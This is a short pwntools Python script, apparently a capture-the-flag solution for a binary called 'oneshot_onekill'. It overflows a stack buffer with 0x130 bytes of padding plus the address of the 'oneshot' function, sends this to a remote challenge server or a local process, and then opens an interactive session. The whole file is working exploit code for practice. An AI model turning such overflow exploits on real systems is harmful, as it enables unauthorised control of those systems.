#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./oneshot_onekill')
elif debug == 0:
    p = remote('prob.vulnerable.kr', 20026)
elf = ELF('./oneshot_onekill', checksec=False)
addr_target = elf.sym['oneshot']

pd = 'a' * 0x130
pd += p32(addr_target)
p.sendline(pd)
p.interactive()
